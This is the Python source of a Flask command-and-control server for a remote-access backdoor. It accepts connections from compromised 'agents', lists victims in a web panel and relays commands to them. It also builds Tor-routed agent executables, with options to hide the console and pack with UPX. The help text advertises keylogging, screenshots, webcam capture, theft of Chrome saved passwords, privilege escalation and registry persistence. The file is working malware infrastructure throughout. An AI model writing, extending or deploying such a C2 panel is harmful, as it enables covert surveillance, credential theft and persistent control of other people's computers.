from flask import Flask, render_template, jsonify, request, send_from_directory
import json
import os
import socket
from bot import Bot
from title import title
import threading
from werkzeug.utils import secure_filename
from datetime import datetime
import logging
import signal
import sys
import subprocess
import uuid

# Add the current directory to Python path
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

from build_agent import setup_build_environment, append_address

app = Flask(__name__)

# Global variables
start_flag = True
sock = None
t1 = None

# Add these constants after the existing ones
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'exe'}
HELP_TEXT = '''
Available Commands:
------------------
Basic Commands:
  help                  --> Show this help message
  quit                  --> Quit Session With The Target
  clear                 --> Clear The Screen
  cd <directory>        --> Changes Directory On Target System

File Operations:
  upload <file>         --> Upload File To The Target Machine From uploads/ Directory
  download <file>       --> Download File From Target Machine
  get <url>            --> Download File From Specified URL to Target ./

Surveillance:
  screenshot           --> Takes screenshot and sends to server ./images/screenshots/
  webcam              --> Takes image with webcam and sends to ./images/webcam/
  keylog_start        --> Start The Keylogger
  keylog_dump         --> Print Keystrokes From taskmanager.txt
  keylog_stop         --> Stop And Self Destruct Keylogger File
  chrome_pass         --> Retrieves Browser Saved Passwords

System Commands:
  start <program>      --> Spawn Program Using backdoor (e.g. 'start notepad')
  check               --> Check If Has Administrator Privileges
  privilege           --> Attempt to escalate privileges
  remove_backdoor     --> Removes backdoor from target

Windows Specific:
  persistence <RegName> <filename>  --> Create Persistence In Registry
'''

# Add this configuration after creating the Flask app
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Set up logging after Flask app creation
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)

def initialise_socket():
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', 5555))
    sock.listen(5)
    sock.settimeout(5)  # Set timeout for accept()
    return sock

def accept_connections():
    logging.info("C2 Server started and listening for connections...")
    while True:
        if not start_flag:
            break
        try:
            target, ip = sock.accept()
            try:
                bot = Bot(target, ip)
                # Get OS info from client
                bot.reliable_send('sysinfo')
                try:
                    sysinfo = bot.reliable_recv()
                    if isinstance(sysinfo, str):
                        # If response is a string, try to parse it as JSON
                        try:
                            sysinfo = json.loads(sysinfo)
                        except json.JSONDecodeError:
                            sysinfo = {'os': 'Unknown', 'hostname': 'Unknown', 'username': 'Unknown'}
                    
                    if isinstance(sysinfo, dict):
                        bot.os_type = sysinfo.get('os', 'Unknown')
                        bot.hostname = sysinfo.get('hostname', 'Unknown')
                        bot.username = sysinfo.get('username', 'Unknown')
                        bot.is_admin = sysinfo.get('is_admin', False)
                    
                except Exception as e:
                    logging.error(f"Error getting system info: {e}")
                    bot.os_type = 'Unknown'
                    bot.hostname = 'Unknown'
                    bot.username = 'Unknown'
                    bot.is_admin = False
                
                logging.info(f"New agent connected - IP: {ip[0]}:{ip[1]} | OS: {bot.os_type} | Session ID: {bot.id}")
                print(f"\n[+] New agent connected from {ip[0]}:{ip[1]}")
                print(f"[*] Session ID: {bot.id}")
                print(f"[*] OS: {bot.os_type}")
                print(f"[*] Hostname: {bot.hostname}")
                print('[**] Command & Control Center: ', end="")
                
            except Exception as e:
                logging.error(f"Error creating bot instance: {e}")
                if target:
                    target.close()
                
        except socket.timeout:
            continue
        except Exception as e:
            logging.error(f"Error accepting connection: {e}")

@app.route('/')
def index():
    return render_template('index.html', title=title())

@app.route('/api/targets')
def get_targets():
    targets = []
    for bot_id in Bot.botList:
        bot = Bot.botList[bot_id]
        target_data = {
            'id': bot.id,
            'ip': str(bot.ip),
            'alias': bot.alias,
            'connected_time': bot.connected_time.isoformat(),
            'last_seen': bot.last_seen.isoformat(),
            'os_type': bot.os_type,
            'hostname': bot.hostname,
            'username': bot.username,
            'is_admin': bot.is_admin
        }
        targets.append(target_data)
    return jsonify(targets)

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        return jsonify({'message': f'File {filename} uploaded successfully',
                       'path': filepath})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.get_json()
    session_id = int(data.get('session_id'))  # Convert to int since it comes as string from JS
    command = data.get('command')
    
    if session_id not in Bot.botList:
        return jsonify({'error': 'Invalid session ID'}), 400
        
    bot = Bot.botList[session_id]
    try:
        # Send command to agent
        bot.reliable_send(command)
        
        # Get response from agent
        response = bot.reliable_recv()
        if response is None:  # Handle connection issues
            raise Exception("No response from agent")
            
        # Update last seen time
        bot.update_last_seen()
        
        # Log command execution
        logging.info(f"Command executed on Session {session_id} ({bot.ip}): {command}")
        
        # Add command to history
        return jsonify({
            'success': True,
            'output': response,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        logging.error(f"Error executing command on Session {session_id}: {e}")
        return jsonify({
            'error': f'Command execution failed: {str(e)}'
        }), 500

@app.route('/api/set_alias', methods=['POST'])
def set_alias():
    data = request.get_json()
    session_id = data.get('session_id')
    new_alias = data.get('alias')
    
    if session_id not in Bot.botList:
        return jsonify({'error': 'Invalid session ID'}), 400
        
    Bot.botList[session_id].alias = new_alias
    return jsonify({'message': 'Alias updated successfully'})

def start_server():
    global sock, t1
    sock = initialise_socket()
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    logging.info("Server started successfully")

# Add these functions for graceful shutdown
def signal_handler(sig, frame):
    logging.info("Received shutdown signal, cleaning up...")
    shutdown_server()
    sys.exit(0)

def shutdown_server():
    global start_flag, sock, t1
    logging.info("Initiating server shutdown...")
    
    # Stop accepting new connections
    start_flag = False
    
    # Close all active sessions
    for session_id in list(Bot.botList.keys()):
        try:
            Bot.botList[session_id].kill()
            logging.info(f"Terminated session {session_id}")
        except Exception as e:
            logging.error(f"Error terminating session {session_id}: {e}")
    
    # Close the socket
    if sock:
        try:
            sock.close()
            logging.info("Closed main socket")
        except Exception as e:
            logging.error(f"Error closing socket: {e}")
    
    # Wait for accept thread to finish
    if t1 and t1.is_alive():
        try:
            t1.join(timeout=5)
            logging.info("Accept thread terminated")
        except Exception as e:
            logging.error(f"Error joining accept thread: {e}")
    
    logging.info("Server shutdown complete")

# Add these routes
@app.route('/api/build_agent', methods=['POST'])
def build_agent():
    data = request.get_json()
    build_id = str(uuid.uuid4())
    
    # Start build process in background
    thread = threading.Thread(
        target=build_agent_process,
        args=(build_id, data)
    )
    thread.start()
    
    return jsonify({
        'status': 'building',
        'build_id': build_id
    })

@app.route('/api/build_status/<build_id>')
def build_status(build_id):
    status = get_build_status(build_id)
    return jsonify(status)

@app.route('/download/<filename>')
def download_file(filename):
    return send_from_directory('dist', filename)

# Build process tracking
build_processes = {}

def build_agent_process(build_id, data):
    try:
        build_processes[build_id] = {
            'state': 'building',
            'progress': 0,
            'status': 'Setting up build environment...'
        }
        
        # Setup build environment
        if not setup_build_environment(data['language']):
            raise Exception("Failed to setup build environment")
        
        # Create agent configuration
        agent_config = {
            'language': data['language'],
            'onion_address': data['onion_address'],
            'port': data['port'],
            'skills': data['skills']
        }
        
        # Write configuration
        with open('agent_config.json', 'w') as f:
            json.dump(agent_config, f)
            
        build_processes[build_id]['progress'] = 20
        build_processes[build_id]['status'] = 'Building agent...'
        
        # Build command based on language
        if data['language'] == 'python':
            cmd = [
                'pyinstaller',
                'agent.py',
                '--onefile',
                '--clean',
                '--add-data=agent_config.json;.'
            ]
        else:  # C++
            cmd = [
                'g++',
                'agent.cpp',
                '-o',
                'agent',
                '-std=c++17'
            ]
        
        # Add platform specific options
        if data['language'] == 'python':
            if data['options']['noconsole']:
                cmd.append('--noconsole')
                
            if data['platform'] == 'windows':
                cmd.extend(['--add-data=torbundle;torbundle'])
                if data['options']['upx']:
                    cmd.extend(['--upx-dir=upx-3.96-win64'])
            else:
                cmd.extend(['--add-data=torbundle:torbundle'])
        
        # Run build
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        stdout, stderr = process.communicate()
        
        if process.returncode != 0:
            raise Exception(stderr.decode())
            
        build_processes[build_id]['progress'] = 80
        build_processes[build_id]['status'] = 'Finalizing build...'
        
        # Get output filename
        output_file = os.path.join('dist', 'agent.exe' if data['platform'] == 'windows' else 'agent')
        
        # Append address to executable
        if not append_address(output_file, data['onion_address'], int(data['port'])):
            raise Exception("Failed to append address to executable")
        
        build_processes[build_id] = {
            'state': 'complete',
            'progress': 100,
            'status': 'Build complete',
            'filename': 'agent.exe' if data['platform'] == 'windows' else 'agent'
        }
        
    except Exception as e:
        build_processes[build_id] = {
            'state': 'error',
            'progress': 0,
            'status': 'Build failed',
            'error': str(e)
        }

def get_build_status(build_id):
    return build_processes.get(build_id, {
        'state': 'error',
        'progress': 0,
        'status': 'Build not found'
    })

@app.route('/api/storage')
def get_storage():
    storage_data = {
        'downloads': get_files_in_directory('downloads'),
        'screenshots': get_files_in_directory('images/screenshots'),
        'uploads': get_files_in_directory('uploads')
    }
    return jsonify(storage_data)

@app.route('/api/delete_file', methods=['POST'])
def delete_file():
    data = request.get_json()
    path = data.get('path')
    
    # Validate path is within allowed directories
    if not is_safe_path(path):
        return jsonify({'error': 'Invalid path'}), 400
        
    try:
        os.remove(path)
        return jsonify({'message': 'File deleted successfully'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def get_files_in_directory(directory):
    files = []
    if os.path.exists(directory):
        for filename in os.listdir(directory):
            filepath = os.path.join(directory, filename)
            if os.path.isfile(filepath):
                files.append({
                    'name': filename,
                    'path': filepath,
                    'size': os.path.getsize(filepath),
                    'modified': os.path.getmtime(filepath)
                })
    return files

def is_safe_path(path):
    base_dir = os.path.abspath(os.path.dirname(__file__))
    file_path = os.path.abspath(path)
    return base_dir in file_path

if __name__ == '__main__':
    try:
        # Register signal handler
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Start server
        start_server()
        logging.info("Server started successfully")
        
        # Run Flask app
        app.run(debug=True, use_reloader=False)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        shutdown_server()
    finally:
        logging.info("Server stopped") 